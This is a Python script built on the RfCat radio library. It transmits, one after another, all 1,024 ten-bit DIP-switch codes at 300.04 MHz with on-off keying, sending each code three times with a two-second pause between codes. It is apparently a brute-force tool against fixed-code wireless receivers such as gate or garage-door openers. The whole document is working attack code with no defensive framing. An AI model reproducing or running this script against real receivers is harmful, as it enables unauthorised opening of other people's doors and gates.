import time
from rflib import *
from binascii import unhexlify

d = RfCat()
d.setFreq(300040000)
d.setMdmModulation(MOD_ASK_OOK)
d.setMdmDRate(4800)

for num in xrange(1024):
	signal_code_hex_raw = ''
	signal_code_binary_part = ''
	dip_switch_combo = bin(num)[2:].zfill(10) # turn number num into 10-digit binary (pad zero's in front if necessary)
	
	count = 0
	
	for s in dip_switch_combo:
		count += 1
		
		if s == '1':
			signal_code_binary_part += '1110'
		else:
			signal_code_binary_part += '1000'
		
		if count % 2 == 0:
			a = hex(int(signal_code_binary_part, 2))[2:] # turn 8-digit binary number (2 dip switches) into hexadecimal
			signal_code_hex_raw += a 
			signal_code_binary_part = ''

	signal_code_hex_raw += '000000000000000000000000' # pad trailing zero's (spacing between signal transmission)
	signal_code_hex = unhexlify(signal_code_hex_raw) # put into format /x88/x88/x88/x88/x88 , not a typical string (print it and see)

	d.RFxmit(signal_code_hex*3) # transmit the signal 3 times
	
	print 'DS combo ' + dip_switch_combo + ' sent (number=' + str(num) + ')'
	print '++-------------------------------------------------------------------++'
	print ''
	
	time.sleep(2) # wait 2 seconds until transmitting the next unique dip switch signal

